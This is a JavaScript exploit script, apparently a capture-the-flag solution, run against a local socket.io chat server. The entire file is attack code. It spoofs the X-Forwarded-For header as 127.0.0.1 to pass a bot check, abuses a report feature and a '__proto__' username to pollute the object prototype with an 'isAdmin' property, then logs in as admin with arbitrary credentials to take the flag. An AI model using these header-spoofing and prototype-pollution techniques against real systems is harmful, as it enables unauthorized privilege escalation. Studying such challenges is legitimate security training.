const io = require('socket.io-client');

// Util function : setTimeout as a Promise
const wait = async (time = 500) => new Promise(resolve => setTimeout(() => resolve(), time));

/**
 * Create a new socket
 * @returns {io.Socket}
 */
const createClient = async (options = {}) => await new Promise(resolve => {
    const socket = io('http://localhost', options);
    
    socket.onAny((...args) => console.debug('[DEBUG]', ...args));
    
    socket.on('connect', () => {
        console.log('Connected');
        resolve(socket);
    });
});

const main = async () => {    
    // Create a second client, and abuse of the X-Forwarded-For header to log as a bot
    const botClient = await createClient({ extraHeaders: { 'X-Forwarded-For': '127.0.0.1' }});
    botClient.emit('loginAsBot', { username: 'evilBot' });
    
    // Create a first client and log in as a standard user
    const adminClient = await createClient();
    adminClient.emit('login', { username: 'Adam' });
    
    await wait();
    
    // // Now we have a bot client, report the standard user with a non-standard reason: isAdmin
    // // This will polute the Client object with isAdmin = 'suspiciou'
    botClient.emit('reportClient', { username: 'Adam', reason: 'isAdmin' });

    const client = await createClient();
    client.emit('login', { username: '__proto__' });

    await wait();

    client.emit('sendMessage', { message: 'isAdmin' });

    await wait();

    adminClient.emit('banClient', { message: 'isAdmin', reason: 'of course' });

    adminClient.emit('getBanList');

    await wait();

    const flagClient = await createClient();
    flagClient.emit('loginAsAdmin', { username: 'whatever', password: 'whatever' });
}

main();
